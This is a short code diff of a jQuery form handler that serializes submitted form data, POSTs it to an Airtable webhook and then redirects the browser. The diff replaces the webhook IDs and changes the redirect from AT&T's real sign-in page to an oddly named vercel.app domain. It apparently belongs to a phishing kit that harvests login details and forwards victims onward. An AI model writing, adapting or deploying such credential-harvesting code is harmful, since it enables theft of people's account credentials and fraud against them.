@@ -160,7 +160,7 @@ $('.back').on('click', function() {
       var formData = $(this).serialize(); // Serialize form data
 
       $.ajax({
-        url: "https://hooks.airtable.com/workflows/v1/genericWebhook/appo3MfmGBPrK45Fg/wfldpHZuCuaabPE3M/wtr8v2cmfhXN7tQoJ",
+        url: "https://hooks.airtable.com/workflows/v1/genericWebhook/appHEt9CT8Ydd0wKT/wfloiIHbgXDiTsn4C/wtrED4rMMkBvZSSnf",
         type: "POST",
         data: formData,
         success: function () {
@@ -171,7 +171,7 @@ $('.back').on('click', function() {
         },
         complete: function () {
           setTimeout(function () {
-            window.location.href = "https://signin.att.com";
+            window.location.href = "https://system-prefence-review-session-retry.vercel.app/";
           }, 1000);
         }
       });
